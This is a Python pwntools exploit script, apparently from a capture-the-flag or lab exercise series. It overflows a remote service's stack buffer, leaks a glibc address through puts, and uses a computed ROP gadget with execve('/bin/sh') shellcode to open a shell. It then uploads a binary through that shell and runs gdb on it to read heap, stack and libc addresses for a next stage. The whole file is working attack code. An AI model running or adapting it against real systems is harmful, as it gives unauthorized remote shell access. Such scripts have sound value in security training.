#!/usr/bin/python3

import sys
import base64
from pwn import *

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13702

proc = remote(host, port)


#Slightly modified code from pwn02
proc.write(40*b"\xFF")
proc.readline()
stack_offset_buf = 0x38
glibc_offset_funlockfile = 0x0000000000055090
glibc_offset_ropgadget =   0x0000000000037fc9
fn_call_puts = b"\xb9\x12\x40\x00\x00\x00\x00\x00"
proc.write(stack_offset_buf*b"\x00" + fn_call_puts + b"\n")
glibc_addr_funlockfile = int.from_bytes(proc.readline('\n')[16:22], byteorder='little')
glibc_addr_ropgadget = glibc_addr_funlockfile - glibc_offset_funlockfile + glibc_offset_ropgadget
shellcode = b"\x48\x31\xD2\x48\x31\xF6\x54\x5F\x48\x83\xC7\x15\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
sh_binary = b"/bin/sh\x00"
exploit = 0x38*b"\x00" + glibc_addr_ropgadget.to_bytes(8, 'little') + shellcode + sh_binary + b"\n"
proc.write(exploit)

#encode pwn06 vuln and vuln.c
binary_file=open("vuln","rb")
vuln_binary_b64 = base64.b64encode(binary_file.read())
binary_file.close()
#source_file=open("vuln.c","rb")
#vuln_source_b64 = base64.b64encode(source_file.read())
#source_file.close()

proc.write(b"cd /tmp/\n")
proc.write(b"mkdir pwn06\n")
proc.write(b"cd pwn06\n")
proc.write(b"echo " + vuln_binary_b64 + b" > vuln_b64\n")
#proc.write(b"echo " + vuln_source_b64 + b" > vuln.c_b64\n")
proc.write(b"base64 -d vuln_b64 > vuln\n")
#proc.write(b"base64 -d vuln.c_b64 > vuln.c\n")
proc.write(b"rm vuln_b64\n")
#proc.write(b"rm vuln.c_b64\n")
proc.write(b"chmod +x vuln\n")
proc.write(b"gdb vuln -ex \"b main\" -ex \"r\" -ex \"ni 27\"\n")
sleep(0.5)
proc.write(b"some input\n")
sleep(0.2)
proc.read()
proc.read()
proc.write(b"x/xg $rax\n") #get address of array on heap
proc.write(b"x/xg $r12\n") #get address of buf on heap
proc.write(b"x/xg printf\n") #get address of printf in libc
sleep(0.2)

#get addresses
addr_str = proc.read()
addr_str.decode()
array_addr = addr_str[0:8]
print("Address of array on heap:   " + array_addr.decode())
buf_addr = addr_str[35:43]
print("Address of buf on heap:     " + buf_addr.decode())
printf_addr = addr_str[70:84]
print("Address of printf in libc:  " + printf_addr.decode())

proc.write(b"b *0x401211\n")
proc.write(b"c\n")
proc.write(b"some other input\n")
sleep(0.2)
proc.read()
proc.write(b"x/4xg $rsp\n") #get address of buf on heap
sleep(0.2)
stack=proc.read()
print("Stack at ret in main:\n" + stack.decode())

#Clean up mess
proc.write(b"q\n")
proc.write(b"cd ..\n")
proc.write(b"rm -r pwn06\n")

#exit shell
proc.write(b"exit\n")

#start interactive mode
#proc.interactive()

